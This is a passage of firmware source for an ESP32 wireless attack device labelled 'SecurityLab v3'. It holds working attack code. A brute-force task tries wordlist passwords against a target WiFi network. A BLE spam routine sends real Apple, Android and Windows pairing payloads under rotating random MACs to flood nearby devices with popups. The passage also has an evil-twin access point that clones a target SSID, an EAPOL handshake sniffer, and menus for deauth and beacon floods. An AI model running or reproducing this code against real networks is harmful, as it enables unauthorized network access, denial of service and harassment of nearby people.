        WiFi.begin(g_brute.ssid, line.c_str());

        unsigned long start = millis();
        wl_status_t st = WL_DISCONNECTED;
        while (millis() - start < g_brute.perPwdMs && g_brute.active) {
            st = WiFi.status();
            if (st == WL_CONNECTED) break;
            if (st == WL_CONNECT_FAILED || st == WL_NO_SSID_AVAIL) break;
            vTaskDelay(pdMS_TO_TICKS(80));
        }

        if (st == WL_CONNECTED) {
            g_brute.found = true;
            strncpy(g_brute.foundPwd, line.c_str(), 63);
            g_brute.foundPwd[63] = '\0';
            logAdd(String("Brute SUCCESS: ") + g_brute.ssid + " → " + line, "WARN");
            WiFi.disconnect(true, true);
            g_brute.active = false;
            break;
        }

        WiFi.disconnect(true, true);
        vTaskDelay(pdMS_TO_TICKS(120));   // settle before next attempt

        // Periodic progress log
        if (g_brute.tried % 5 == 0)
            logAdd("Brute: " + String(g_brute.tried) + "/" + String(g_brute.total) +
                   " (" + String(line) + ")");
    }

    f.close();
    if (!g_brute.found)
        logAdd("Brute ended — no match (" + String(g_brute.tried) + " tried)", "WARN");

    g_brute.curPwd[0] = '\0';
    g_brute.active    = false;
    g_bruteTask       = nullptr;
    vTaskDelete(nullptr);
}

bool startBruteForce(const char* ssid, const char* wordlistPath, uint32_t perPwdMs) {
    stopBruteForce();
    if (g_deauth.active)      stopDeauth();
    if (g_beacon.active)      stopBeaconFlood();
    if (g_evilTwin.active)    stopEvilTwin();
    if (g_eapolActive)        stopEapolSniffer();
    if (g_probeActive)        stopProbeSniffer();

    strncpy(g_brute.ssid, ssid, 32); g_brute.ssid[32] = '\0';
    if (wordlistPath && wordlistPath[0]) {
        strncpy(g_brute.wordlist, wordlistPath, 23);
        g_brute.wordlist[23] = '\0';
    } else {
        strcpy(g_brute.wordlist, "/wordlist.txt");
    }
    g_brute.perPwdMs = (perPwdMs >= 1500 && perPwdMs <= 15000) ? perPwdMs : 4000;
    g_brute.tried    = 0;
    g_brute.found    = false;
    g_brute.foundPwd[0] = '\0';
    g_brute.curPwd[0]   = '\0';
    g_brute.total    = countWordlistLines(g_brute.wordlist);
    if (g_brute.total == 0) {
        logAdd("Brute: wordlist empty or missing", "WARN");
        return false;
    }
    g_brute.active = true;
    xTaskCreatePinnedToCore(bruteTaskFn, "brute", 8192, nullptr, 4, &g_bruteTask, 0);
    return true;
}

void stopBruteForce() {
    if (!g_brute.active && !g_bruteTask) return;
    g_brute.active = false;
    // Let the task observe the flag and exit cleanly
    for (int i = 0; i < 30 && g_bruteTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
    if (g_bruteTask) { vTaskDelete(g_bruteTask); g_bruteTask = nullptr; }
    WiFi.disconnect(true, true);
    logAdd("Brute stopped (tried=" + String(g_brute.tried) + ")");
}

// ─────────────────────────────────────────────────────────────
//  ████  BLE SCANNER  ████
// ─────────────────────────────────────────────────────────────
class BLEScanCB : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice dev) override {
        if ((int)g_bleResults.size() >= MAX_BLE_RESULTS) return;
        BLEResult r;
        r.addr = dev.getAddress().toString().c_str();
        r.rssi = dev.getRSSI();
        r.name = dev.haveName() ? dev.getName().c_str() : "";
        r.type = dev.getAddressType()==BLE_ADDR_TYPE_PUBLIC ? "PUBLIC" : "RANDOM";
        g_bleResults.push_back(r);
    }
};
static BLEScanCB g_bleScanCBInstance;

void startBLEScan(int seconds) {
    g_bleResults.clear();
    g_bleScanActive = true;
    g_oledDirty = true;
    g_bleScan->clearResults();
    g_bleScan->start(seconds, false);
    g_bleScanActive = false;

    // Auto-jump from the "Scanning…" splash to the device list
    if (g_screen == SCR_BLE_SCAN) {
        g_bleSelected = 0;
        g_bleScroll   = 0;
        g_screen      = SCR_BLE_LIST;
    }

    g_oledDirty = true;
    logAdd("BLE scan done: "+String(g_bleResults.size())+" devices");
}

// ─────────────────────────────────────────────────────────────
//  ████  BLE SPAM  — real popup-triggering payloads  ████
// ─────────────────────────────────────────────────────────────
#include "esp_gap_ble_api.h"

struct BlePayload { const uint8_t* data; size_t len; const char* name; };

// === Apple Continuity Nearby Action — triggers iOS popups =====
// Format: [len][0xFF][0x4C 0x00 = Apple ID][0x07 = Nearby Action][...]
// Byte at index 7 is the device model that determines which popup shows.

static const uint8_t APPLE_AIRPODS_PRO[] = {
    0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0E,
    0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,
    0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const uint8_t APPLE_AIRPODS[] = {
    0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x02,
    0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,
    0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const uint8_t APPLE_AIRPODS_MAX[] = {
    0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0A,
    0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,
    0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const uint8_t APPLE_AIRTAG[] = {
    0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x05,
    0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,
    0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const uint8_t APPLE_TV_SETUP[] = {
    0x16,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,
    0x00,0x00,0x00,0x10,0x02,0xC0,0xC0,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00
};

static const BlePayload APPLE_PAYLOADS[] = {
    {APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), "AirPods Pro"},
    {APPLE_AIRPODS,     sizeof(APPLE_AIRPODS),     "AirPods"},
    {APPLE_AIRPODS_MAX, sizeof(APPLE_AIRPODS_MAX), "AirPods Max"},
    {APPLE_AIRTAG,      sizeof(APPLE_AIRTAG),      "AirTag"},
    {APPLE_TV_SETUP,    sizeof(APPLE_TV_SETUP),    "Apple TV"},
};
static const int APPLE_PAYLOADS_N = 5;

// === Google Fast Pair — real model IDs that pop on Android =====
// Service UUID 0xFE2C, then 3-byte model ID. We rotate through known
// product IDs so each ad looks like a different "discoverable" earbud.

static const uint8_t FP_PIXEL_BUDS[] = {
    0x03,0x03,0x2C,0xFE, 0x06,0x16,0x2C,0xFE, 0xF5,0x24,0x94
};
static const uint8_t FP_BOSE_QC35[]  = {
    0x03,0x03,0x2C,0xFE, 0x06,0x16,0x2C,0xFE, 0xCD,0x82,0x56
};
static const uint8_t FP_SONY_WH[]    = {
    0x03,0x03,0x2C,0xFE, 0x06,0x16,0x2C,0xFE, 0xC8,0xD4,0xF8
};

static const BlePayload ANDROID_PAYLOADS[] = {
    {FP_PIXEL_BUDS, sizeof(FP_PIXEL_BUDS), "Pixel Buds"},
    {FP_BOSE_QC35,  sizeof(FP_BOSE_QC35),  "Bose QC35"},
    {FP_SONY_WH,    sizeof(FP_SONY_WH),    "Sony WH"},
};
static const int ANDROID_PAYLOADS_N = 3;

// === Microsoft Swift Pair — Windows 10/11 popup =================
static const uint8_t MS_SWIFT_PAIR[] = {
    0x02,0x01,0x06,
    0x07,0xFF,0x06,0x00,0x03,0x00,0x80,0x00
};
static const BlePayload WINDOWS_PAYLOADS[] = {
    {MS_SWIFT_PAIR, sizeof(MS_SWIFT_PAIR), "Swift Pair"},
};
static const int WINDOWS_PAYLOADS_N = 1;

// Force a fresh random BT MAC every ad — phones treat each as a new device
static void randomizeBleMac() {
    esp_bd_addr_t mac;
    for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
    mac[0] |= 0xC0;   // top 2 bits = 11 → static random address
    esp_ble_gap_set_rand_addr(mac);
}

void bleSpamTaskFn(void*) {
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    adv->setMinInterval(0x20);   // 20 ms
    adv->setMaxInterval(0x20);
    int phase = 0;

    while (g_bleSpamActive) {
        // Build pool of enabled payloads
        BlePayload pool[16]; int n = 0;
        if (g_bleSpamPlatforms.apple)
            for (int i=0;i<APPLE_PAYLOADS_N&&n<16;i++)  pool[n++] = APPLE_PAYLOADS[i];
        if (g_bleSpamPlatforms.android)
            for (int i=0;i<ANDROID_PAYLOADS_N&&n<16;i++) pool[n++] = ANDROID_PAYLOADS[i];
        if (g_bleSpamPlatforms.windows)
            for (int i=0;i<WINDOWS_PAYLOADS_N&&n<16;i++) pool[n++] = WINDOWS_PAYLOADS[i];
        if (n == 0) { vTaskDelay(pdMS_TO_TICKS(200)); continue; }

        BlePayload& p = pool[phase % n];
        phase++;

        BLEAdvertisementData data;
        data.addData(std::string((char*)p.data, p.len));

        adv->stop();
        randomizeBleMac();              // each ad gets a fresh MAC
        adv->setAdvertisementData(data);
        adv->start();

        vTaskDelay(pdMS_TO_TICKS(80));  // ≈12 ads/sec — visible to phones
    }

    adv->stop();
    g_bleSpamTask = nullptr;
    logAdd("BLE spam stopped");
    vTaskDelete(nullptr);
}

// Map the SCR_BLE_TARGET selector onto the platform flags
static void applySpamTarget() {
    g_bleSpamPlatforms.apple   = (g_spamTarget == TGT_ALL || g_spamTarget == TGT_APPLE);
    g_bleSpamPlatforms.android = (g_spamTarget == TGT_ALL || g_spamTarget == TGT_ANDROID);
    g_bleSpamPlatforms.windows = (g_spamTarget == TGT_ALL || g_spamTarget == TGT_WINDOWS);
}

void startBLESpam(const String& type) {
    stopBLESpam();
    g_bleSpamType   = type;
    g_bleSpamActive = true;
    xTaskCreatePinnedToCore(bleSpamTaskFn,"ble_spam",4096,nullptr,3,&g_bleSpamTask,0);
    logAdd("BLE spam started ["+type+"]","WARN");
}

void stopBLESpam() {
    g_bleSpamActive = false;
    delay(150);
    if (g_bleSpamTask){ vTaskDelete(g_bleSpamTask); g_bleSpamTask=nullptr; }
    BLEDevice::getAdvertising()->stop();
}

// ─────────────────────────────────────────────────────────────
//  ████  WIFI SCAN TASK  (IDF, bypasses Arduino wrapper) ████
// ─────────────────────────────────────────────────────────────
// Build scan JSON + fill g_aps[] from Arduino WiFi.scanNetworks() results.
// WiFi.scanNetworks() handles APSTA mode correctly (enables STA before scan,
// manages channel hopping, restores AP state). Direct esp_wifi_scan_start()
// returned 0 in APSTA mode because it skips the STA enablement step.
static uint16_t buildScanJsonArduino(int count) {
    DynamicJsonDocument doc(6144);
    doc["count"]  = count;
    doc["status"] = "complete";
    JsonArray arr = doc.createNestedArray("networks");
    g_apCount = 0;
    for (int i = 0; i < count; i++) {
        JsonObject o = arr.createNestedObject();
        String ssid = WiFi.SSID(i);
        o["ssid"]    = ssid.isEmpty() ? "[Hidden]" : ssid.c_str();
        o["bssid"]   = WiFi.BSSIDstr(i).c_str();
        o["rssi"]    = WiFi.RSSI(i);
        o["channel"] = WiFi.channel(i);
        int q = WiFi.RSSI(i)<=-100?0:WiFi.RSSI(i)>=-50?100:2*(WiFi.RSSI(i)+100);
        o["quality"] = q;
        const char* enc;
        switch(WiFi.encryptionType(i)){
            case WIFI_AUTH_OPEN:            enc="OPEN";     break;
            case WIFI_AUTH_WEP:             enc="WEP";      break;
            case WIFI_AUTH_WPA_PSK:         enc="WPA";      break;
            case WIFI_AUTH_WPA2_PSK:        enc="WPA2";     break;
            case WIFI_AUTH_WPA_WPA2_PSK:    enc="WPA/2";    break;
            case WIFI_AUTH_WPA2_ENTERPRISE: enc="WPA2-ENT"; break;
            case WIFI_AUTH_WPA3_PSK:        enc="WPA3";     break;
            default:                        enc="UNKNOWN";  break;
        }
        o["enc"] = enc;
        if (g_apCount < MAX_APS) {
            WifiAP& a = g_aps[g_apCount];
            strncpy(a.ssid, ssid.isEmpty() ? "[Hidden]" : ssid.c_str(), 32);
            a.ssid[32] = '\0';
            uint8_t* bssid = WiFi.BSSID(i);
            if (bssid) memcpy(a.bssid, bssid, 6);
            a.channel  = WiFi.channel(i);
            a.rssi     = WiFi.RSSI(i);
            a.selected = false;
            g_apCount++;
        }
    }
    serializeJson(doc, g_scanJson);
    return (uint16_t)count;
}

void wifiScanTaskFn(void*) {
    // ── Step 1: idle all BLE operations ─────────────────────────
    if (g_bleSpamActive) stopBLESpam();
    else BLEDevice::getAdvertising()->stop();
    if (g_bleScanActive && g_bleScan) g_bleScan->stop();
    g_bleReady = false;
    vTaskDelay(pdMS_TO_TICKS(300));

    // ── Step 2: FULL BLE stack teardown ──────────────────────────
    // Required sequence: disable→deinit bluedroid, then disable→deinit controller.
    // Both layers must reach UNINITIALIZED state so that:
    //   (a) WIFI_PS_NONE can be set without abort()
    //   (b) esp_bt_controller_init() succeeds cleanly on restart
    logAdd("Scan: stopping BLE...");
    esp_bluedroid_disable();
    vTaskDelay(pdMS_TO_TICKS(500));
    esp_bluedroid_deinit();            // DISABLED → UNINITIALIZED
    vTaskDelay(pdMS_TO_TICKS(300));
    esp_bt_controller_disable();
    vTaskDelay(pdMS_TO_TICKS(300));
    esp_bt_controller_deinit();        // INITED → UNINITIALIZED (allows clean re-init)
    vTaskDelay(pdMS_TO_TICKS(200));

    // ── Step 3: scan via Arduino layer (handles STA+APSTA correctly) ─
    // esp_wifi_scan_start() returned 0 APs in APSTA mode because it skips
    // Arduino's WiFi.enableSTA() call. WiFi.scanNetworks() does the right thing.
    esp_wifi_set_ps(WIFI_PS_NONE);     // safe — BT controller is UNINITIALIZED
    WiFi.scanDelete();                 // clear any stale previous results

    int n = WiFi.scanNetworks(/*async=*/false, /*show_hidden=*/true);
    if (n >= 0) {
        buildScanJsonArduino(n);
        logAdd("Wi-Fi scan: " + String(n) + " networks");
    } else {
        g_scanJson = "{\"networks\":[],\"count\":0,\"status\":\"failed\",\"err\":" + String(n) + "}";
        logAdd("Wi-Fi scan failed err=" + String(n), "WARN");
    }
    WiFi.scanDelete();   // free internal Arduino scan buffers

    // ── Step 4: restore coexistence power-save ───────────────────
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    // ── Step 5: FULL BLE stack restart ───────────────────────────
    // Must call init() before enable() since deinit() put them in UNINITIALIZED.
    logAdd("Scan: restarting BLE...");
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);   // UNINITIALIZED → INITED
    vTaskDelay(pdMS_TO_TICKS(200));
    esp_bt_controller_enable(ESP_BT_MODE_BLE);  // INITED → ENABLED
    vTaskDelay(pdMS_TO_TICKS(300));
    esp_bluedroid_init();              // UNINITIALIZED → INITED
    vTaskDelay(pdMS_TO_TICKS(300));
    esp_bluedroid_enable();            // INITED → ENABLED
    vTaskDelay(pdMS_TO_TICKS(500));

    // Re-arm BLE scan callbacks
    if (g_bleScan) {
        g_bleScan->setAdvertisedDeviceCallbacks(&g_bleScanCBInstance);
        g_bleScan->setActiveScan(true);
        g_bleScan->setInterval(100);
        g_bleScan->setWindow(99);
    }

    g_scanRunning = false;
    g_bleReady    = true;

    // Auto-jump from scanning splash → AP picker on OLED
    if (g_screen == SCR_WIFI_SCAN) {
        g_apSelected = 0;
        g_apScroll   = 0;
        g_screen     = SCR_WIFI_LIST;
    }
    g_oledDirty    = true;
    g_wifiScanTask = nullptr;
    vTaskDelete(nullptr);
}

// ─────────────────────────────────────────────────────────────
//  ████  EVIL TWIN  ████
// ─────────────────────────────────────────────────────────────
void startEvilTwin(const String& targetSSID, uint8_t ch) {
    stopEvilTwin();
    g_evilTwin.targetSSID = targetSSID;
    g_evilTwin.channel    = ch;
    g_evilTwin.origSSID   = g_apSSID;
    g_evilTwin.origPass   = g_apPass;
    g_evilTwin.active     = true;
    WiFi.softAP(targetSSID.c_str(), "", ch, 0, 4);
    logAdd("Evil Twin started: ["+targetSSID+"] ch"+String(ch),"WARN");
}

void stopEvilTwin() {
    if (!g_evilTwin.active) return;
    g_evilTwin.active = false;
    WiFi.softAP(g_evilTwin.origSSID.c_str(), g_evilTwin.origPass.c_str(), AP_CHANNEL, 0, 8);
    logAdd("Evil Twin stopped — AP restored to ["+g_evilTwin.origSSID+"]");
}

// ─────────────────────────────────────────────────────────────
//  ████  EAPOL SNIFFER  ████
// ─────────────────────────────────────────────────────────────
static void eapolCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_eapolActive || type!=WIFI_PKT_DATA) return;
    auto* pkt    = (wifi_promiscuous_pkt_t*)buf;
    uint16_t plen= pkt->rx_ctrl.sig_len;
    uint8_t* pay = pkt->payload;
    if (plen<32) return;
    int found=-1;
    for (int i=24;i<(int)plen-1&&i<64;i++) if(pay[i]==0x88&&pay[i+1]==0x8E){found=i;break;}
    if (found<0) return;
    taskENTER_CRITICAL_ISR(&g_eapolMux);
    if (g_eapolCount < MAX_EAPOL) {
        auto* hdr = (Ieee80211Hdr*)pay;
        EapolEntry& e = g_eapolFrames[g_eapolCount];
        snprintf(e.bssid,sizeof(e.bssid),"%02X:%02X:%02X:%02X:%02X:%02X",
                 hdr->bssid[0],hdr->bssid[1],hdr->bssid[2],hdr->bssid[3],hdr->bssid[4],hdr->bssid[5]);
        snprintf(e.client,sizeof(e.client),"%02X:%02X:%02X:%02X:%02X:%02X",
                 hdr->src[0],hdr->src[1],hdr->src[2],hdr->src[3],hdr->src[4],hdr->src[5]);
        e.ts=millis(); g_eapolCount++;
    }
    taskEXIT_CRITICAL_ISR(&g_eapolMux);
}

void startEapolSniffer() {
    g_eapolCount=0; g_eapolActive=true;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(eapolCallback);
    logAdd("EAPOL sniffer started","WARN");
}

void stopEapolSniffer() {
    if (!g_eapolActive) return;
    g_eapolActive=false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    logAdd("EAPOL sniffer stopped ("+String(g_eapolCount)+" frames)");
}

// ─────────────────────────────────────────────────────────────
//  ████  OLED DRAWING  ████
// ─────────────────────────────────────────────────────────────

// Header bar — 10 px, white bg, black text; optional right badge (inverted).
// We use the whole 64-px height now; the header lives in the yellow strip
// (eye-catching by design), the content/list area sits in the blue.
static void oledHeader(const char* title, const char* badge = nullptr) {
    oled.fillRect(0, 0, 128, 10, WHITE);
    oled.setTextColor(BLACK);
    oled.setTextSize(1);
    oled.setCursor(2, 1);
    oled.print(title);
    if (badge) {
        int bw = strlen(badge)*6 + 4;
        oled.fillRect(128-bw, 0, bw, 10, BLACK);
        oled.setTextColor(WHITE);
        oled.setCursor(128-bw+2, 1);
        oled.print(badge);
    }
    oled.setTextColor(WHITE);
}

// Hint bar — bottom 8 px
static void oledHint(const char* txt) {
    oled.setTextColor(WHITE);
    oled.setTextSize(1);
    oled.setCursor(0, 56);
    oled.print(txt);
}

// ── Generic menu draw helper ─────────────────────────────────
// items/n/sel/scroll are the menu data; status badge for header.
static void drawMenuList(const char* title, const char* const* items, int n,
                         int sel, int scroll, const char* badge = nullptr) {
    oled.clearDisplay();
    oledHeader(title, badge);
    const int VISIBLE = 4;
    for (int i = 0; i < VISIBLE; i++) {
        int idx = scroll + i;
        if (idx >= n) break;
        int  y  = 13 + i * 11;
        bool s  = (idx == sel);
        if (s) {
            oled.fillRect(0, y-1, 124, 11, WHITE);
            oled.setTextColor(BLACK);
            oled.setCursor(4, y); oled.print("> ");
        } else {
            oled.setTextColor(WHITE);
            oled.setCursor(4, y);
        }
        oled.print(items[idx]);
        oled.setTextColor(WHITE);
    }
    if (n > VISIBLE) {
        oled.drawFastVLine(126, 12, 42, WHITE);
        int barH = max(4, 42 * VISIBLE / n);
        int barY = 12 + 42 * scroll / n;
        oled.fillRect(125, barY, 3, barH, WHITE);
    }
    oledHint(">next  hold=select");
    oled.display();
}

// ── Main menu (3 items — always fits without scrolling) ──────
static void drawMain() {
    bool anyOn = g_deauth.active || g_beacon.active || g_probeActive ||
                 g_bleSpamActive || g_bleScanActive || g_scanRunning;
    drawMenuList("SecurityLab v3", MAIN_ITEMS, MAIN_ITEMS_N,
                 g_menuSel, g_menuScroll, anyOn ? "ON" : nullptr);
}

// ── WiFi sub-menu ────────────────────────────────────────────
static void drawWifiMenu() {
    bool anyOn = g_deauth.active || g_beacon.active || g_probeActive || g_scanRunning;
    drawMenuList("WiFi", WIFI_MENU_ITEMS, WIFI_MENU_N,
                 g_wifiMenuSel, g_wifiMenuScroll, anyOn ? "ON" : nullptr);
}

// ── BLE sub-menu ─────────────────────────────────────────────
static void drawBLEMenu() {
    bool anyOn = g_bleSpamActive || g_bleScanActive;
    drawMenuList("Bluetooth", BLE_MENU_ITEMS, BLE_MENU_N,
                 g_bleMenuSel, g_bleMenuScroll, anyOn ? "ON" : nullptr);
}

// ── WiFi scanning splash (shown while scan is in progress) ──
static void drawWifiScan() {
    oled.clearDisplay();
    oledHeader("WiFi Scan", "SCAN");
    oled.setTextColor(WHITE);
    oled.setTextSize(1);
    // Spinner animation (updates every 750ms via loop refresh)
    static const char* spin[] = {"|", "/", "-", "\\"};
    int frame = (millis() / 400) % 4;
    oled.setCursor(0, 18); oled.print("BLE: OFF (scan mode)");
    oled.setCursor(0, 30); oled.print("Scanning ");
    oled.print(spin[frame]);
    oled.setCursor(0, 42); oled.print("(~5 sec, BLE restores)");
    oled.display();
}

// ── WiFi AP picker (multi-select → multi-deauth) ─────────────
static void drawWifiList() {
    oled.clearDisplay();
    int selectedCount = 0;
    for (int i = 0; i < g_apCount; i++) if (g_aps[i].selected) selectedCount++;

    char hdr[20];
    snprintf(hdr, sizeof(hdr), "Pick AP [%d]", selectedCount);
    char badge[8];
    snprintf(badge, sizeof(badge), "%d/%d", g_apSelected+1, g_apCount + 1);
    oledHeader(hdr, badge);

    oled.setTextColor(WHITE);
    oled.setTextSize(1);

    if (g_apCount == 0) {
        oled.setCursor(8, 28); oled.print("No networks found");
        oledHint("any key = back");
        oled.display();
        return;
    }

    int total = g_apCount + 1;  // APs + BACK entry only (no KILL here)
    const int VISIBLE = 4;
    for (int i = 0; i < VISIBLE; i++) {
        int idx = g_apScroll + i;
        if (idx >= total) break;
        int y = 13 + i * 11;
        bool sel = (idx == g_apSelected);

        if (sel) {
            oled.fillRect(0, y-1, 124, 11, WHITE);
            oled.setTextColor(BLACK);
        } else {
            oled.setTextColor(WHITE);
        }
        oled.setCursor(2, y);

        if (idx == g_apCount) {
            // BACK entry
            oled.print("<< Back to menu");
        } else {
            // AP entry — checkbox (*=selected) + truncated SSID + channel
            char ssid12[13]; strncpy(ssid12, g_aps[idx].ssid, 12); ssid12[12] = '\0';
            char line[24];
            snprintf(line, sizeof(line), "%c %s c%d",
                     g_aps[idx].selected ? '*' : ' ', ssid12, g_aps[idx].channel);
            oled.print(line);
        }
        oled.setTextColor(WHITE);
    }

    // Scroll bar
    if (total > VISIBLE) {
        oled.drawFastVLine(126, 12, 42, WHITE);
        int barH = max(4, 42 * VISIBLE / total);
        int barY = 12 + 42 * g_apScroll / total;
        oled.fillRect(125, barY, 3, barH, WHITE);
    }

    bool onBack = (g_apSelected == g_apCount);
    oledHint(onBack ? ">next  hold=back" : ">next  hold=select");
    oled.display();
}

// ── Deauth running screen ────────────────────────────────────
static void drawDeauth() {
    oled.clearDisplay();
    oledHeader("Deauth", g_deauth.active ? "RUN" : "STOP");
    oled.setTextColor(WHITE); oled.setTextSize(1);

    // Count selected APs (even if deauth not started yet)
    int selCnt = 0;
    for (int i = 0; i < g_apCount; i++) if (g_aps[i].selected) selCnt++;

    char buf[22];
    if (g_deauth.active && g_deauth.multiMode) {
        snprintf(buf, sizeof(buf), "Mode: %d targets", g_deauth.multiCount);
    } else if (!g_deauth.active && selCnt > 0) {
        snprintf(buf, sizeof(buf), "Ready: %d target%s", selCnt, selCnt==1?"":"s");
    } else {
        snprintf(buf, sizeof(buf), "Mode: broadcast");
    }
    oled.setCursor(0, 14); oled.print(buf);

    snprintf(buf, sizeof(buf), "Ch:%d", g_deauth.channel);
    oled.setCursor(0, 26); oled.print(buf);

    snprintf(buf, sizeof(buf), "Pkts: %lu", (unsigned long)g_deauth.sent);
    oled.setCursor(0, 38); oled.print(buf);

    if (g_deauth.active) {
        oled.setCursor(8, 48); oled.print(">> ATTACKING <<");
    } else {
        oled.setCursor(0, 48); oled.print("Stopped.");
    }
    oledHint(g_deauth.active ? ">back  hold=stop" : ">back  hold=start");
    oled.display();
}

// ── Beacon flood ─────────────────────────────────────────────
static void drawBeacon() {
    oled.clearDisplay();
    oledHeader("Beacon Flood", g_beacon.active ? "RUN" : "STOP");
    oled.setTextColor(WHITE); oled.setTextSize(1);

    char buf[22];
    oled.setCursor(0, 14); oled.print("SSID: #VOID TEST");
    oled.setCursor(0, 26); oled.print("Count: UNLIMITED");
    snprintf(buf, sizeof(buf), "Sent: %d", g_beacon.sent);
    oled.setCursor(0, 38); oled.print(buf);

    if (g_beacon.active) { oled.setCursor(8, 48); oled.print("Flooding..."); }
    oledHint(g_beacon.active ? ">back  hold=stop" : ">back  hold=start");
    oled.display();
}

// ── Beacon count selector ────────────────────────────────────
static void drawBeaconCount() {
    oled.clearDisplay();
    oledHeader("Beacon Count");
    oled.setTextColor(WHITE);
    oled.setTextSize(1);
    oled.setCursor(0, 16); oled.print("How many fake APs:");

    oled.setTextSize(3);
    int bc = BEACON_COUNTS[g_beaconCountIdx];
    char buf[8];
    if (bc == 0) strncpy(buf, "INF", sizeof(buf));
    else         snprintf(buf, sizeof(buf), "%d", bc);
    int textW = strlen(buf) * 18;
    oled.setCursor((128 - textW) / 2, 28);
    oled.print(buf);

    oled.setTextSize(1);
    oledHint(">next  hold=save");
    oled.display();
}

// ── Probe sniffer ────────────────────────────────────────────
static void drawProbe() {
    oled.clearDisplay();
    oledHeader("Probe Sniffer", g_probeActive ? "RUN" : "STOP");
    oled.setTextColor(WHITE); oled.setTextSize(1);

    char buf[22];
    snprintf(buf, sizeof(buf), "Captured: %d", g_probeCount);
    oled.setCursor(0, 14); oled.print(buf);

    if (g_probeCount > 0) {
        int last = g_probeCount - 1;
        oled.setCursor(0, 28); oled.print(g_probes[last].mac);
        char ssidBuf[19];
        snprintf(ssidBuf, sizeof(ssidBuf), "%.18s", g_probes[last].ssid);
        oled.setCursor(0, 40); oled.print(ssidBuf);
    } else {
        oled.setCursor(0, 28); oled.print("Waiting for");
        oled.setCursor(0, 40); oled.print("probe requests...");
    }
    oledHint(g_probeActive ? ">back  hold=stop" : ">back  hold=start");
    oled.display();
}

// ── WiFi brute-force progress ────────────────────────────────
static void drawBrute() {
    oled.clearDisplay();
    const char* status = g_brute.found  ? "FOUND" :
                         g_brute.active ? "RUN"   : "STOP";
    oledHeader("WiFi Brute", status);
    oled.setTextColor(WHITE); oled.setTextSize(1);

    char buf[24];
    // SSID line — truncated to 18 chars
    snprintf(buf, sizeof(buf), "SSID: %.16s", g_brute.ssid[0] ? g_brute.ssid : "(none)");
    oled.setCursor(0, 14); oled.print(buf);

    // Progress
    snprintf(buf, sizeof(buf), "Try: %lu/%lu",
             (unsigned long)g_brute.tried, (unsigned long)g_brute.total);
    oled.setCursor(0, 26); oled.print(buf);

    if (g_brute.found) {
        // Match found — show password truncated to 18 chars
        snprintf(buf, sizeof(buf), "PWD: %.18s", g_brute.foundPwd);
        oled.setCursor(0, 38); oled.print(buf);
        oledHint(">back  hold=back");
    } else if (g_brute.active) {
        // Currently trying — show current password truncated
        snprintf(buf, sizeof(buf), "Now: %.18s",
                 g_brute.curPwd[0] ? g_brute.curPwd : "...");
        oled.setCursor(0, 38); oled.print(buf);
        oledHint(">back  hold=stop");
    } else {
        // Not running (e.g. wordlist missing, or finished without match)
        oled.setCursor(0, 38);
        if (g_brute.total == 0) oled.print("Wordlist missing");
        else                    oled.print("No match");
        oledHint(">back  hold=start");
    }
    oled.display();
}

// ── BLE scanning splash ──────────────────────────────────────
static void drawBLEScan() {
    oled.clearDisplay();
    oledHeader("BLE Scan", "...");
    oled.setTextColor(WHITE); oled.setTextSize(1);
    oled.setCursor(8, 22); oled.print("Scanning BLE...");
    oled.setCursor(8, 34); oled.print("Please wait");
    oledHint("auto-shows list");
    oled.display();
}

// ── BLE device list ──────────────────────────────────────────
static void drawBLEList() {
    oled.clearDisplay();
    int total = (int)g_bleResults.size();
    char hdr[20];
    snprintf(hdr, sizeof(hdr), "BLE devices");
    char badge[8];
    if (total > 0) snprintf(badge, sizeof(badge), "%d/%d", g_bleSelected+1, total);
    else strcpy(badge, "0");
    oledHeader(hdr, badge);

    oled.setTextColor(WHITE); oled.setTextSize(1);

    if (total == 0) {
        oled.setCursor(8, 28); oled.print("No devices found");
        oledHint("any key = back");
        oled.display();
        return;
    }

    const int VISIBLE = 4;
    for (int i = 0; i < VISIBLE; i++) {
        int idx = g_bleScroll + i;
        if (idx >= total) break;
        int y = 13 + i * 11;
        bool sel = (idx == g_bleSelected);

        if (sel) {
            oled.fillRect(0, y-1, 124, 11, WHITE);
            oled.setTextColor(BLACK);
        } else {
            oled.setTextColor(WHITE);
        }
        oled.setCursor(2, y);

        BLEResult& r = g_bleResults[idx];
        char line[24];
        if (r.name.length() > 0) {
            char nm[14]; strncpy(nm, r.name.c_str(), 13); nm[13] = '\0';
            snprintf(line, sizeof(line), "%s %d", nm, r.rssi);
        } else {
            const char* a = r.addr.c_str();
            int L = r.addr.length();
            const char* tail = L >= 8 ? a + L - 8 : a;
            snprintf(line, sizeof(line), "%s %d", tail, r.rssi);
        }
        oled.print(line);
        oled.setTextColor(WHITE);
    }

    if (total > VISIBLE) {
        oled.drawFastVLine(126, 12, 42, WHITE);
        int barH = max(4, 42 * VISIBLE / total);
